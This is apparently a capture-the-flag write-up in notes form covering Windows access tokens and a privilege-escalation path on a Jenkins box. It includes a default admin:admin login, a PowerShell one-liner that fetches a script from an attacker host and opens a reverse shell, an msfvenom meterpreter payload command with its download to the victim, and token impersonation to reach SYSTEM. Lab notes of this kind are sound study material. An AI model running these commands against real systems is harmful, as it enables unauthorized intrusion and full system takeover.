@@ -1,0 +1,68 @@
+-----------------
+NOTES
+------------------
+Windows LSASS priv esc
+Windows has account tokens, usually assigned by LSASS.exe
+consist of:
+	user SIDs - secure identifier
+	group SIDs
+	privileges
+	among others
+
+two types of tokens
+	primary access tokens - associated with a user account athat are generated on log on
+	impersonation tokens - allow a particular procces (or thread) to gain acces to resources useing the token of aanother user or client
+		different levels
+			SecurityAnonymous: current user/client cannot impersonate another user/client
+    	SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
+    	SecurityImpersonation: current user/client can impersonate the client's security context on the local system
+    	SecurityDelegation: current user/client can impersonate the client's security context on a remote system
+
+			Most commonly abused privs
+				SeImpersonatePrivilege
+				SeAssignPrimaryPrivilege
+				SeTcbPrivilege
+				SeBackupPrivilege
+				SeRestorePrivilege
+				SeCreateTokenPrivilege
+				SeLoadDriverPrivilege
+				SeTakeOwnershipPrivilege
+				SeDebugPrivilege
+
+-----------------
+PROCESS
+-----------------
+
+Jenkins server on port 8080
+	admin:admin login
+
+Power shell command to get a shell:
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.13.31.29:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.13.31.29 -Port 4444
+
+can execute shell commands in the jenkins console -> execute the above command to get a reverse connection
+	easily get the flag in the desktop of bruce
+
+UPGRADING SHELL ON WINDOWS
+	with a reverse connection create a new .exe rev shell with msf
+		msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.31.29 LPORT=9001 -f exe -o shell.exe
+
+	Get the msf shell onto the victim
+		powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.31.29:8080/shell.exe','shell.exe')"
+
+	On attacker:
+		load metasploit multi/exploit/handler
+		set options and run the handler
+		execute the shell on the reverse conn
+
+	Priv esc
+		whoami /priv lists the privileges
+			see that we have two interesting tokens
+		load the incognito module of metasploit
+			will allow exploitation of the module
+		list_tokens -g to see all the tokens we have access to
+		BUILTIN\Administrators is sitting there
+			impersonate_token "BUILTIN\Administrators" to get system token
+		with system token, migrate to a process with system privs (services.exe)
+			migrate PID
+
+	root flag is in system32\config
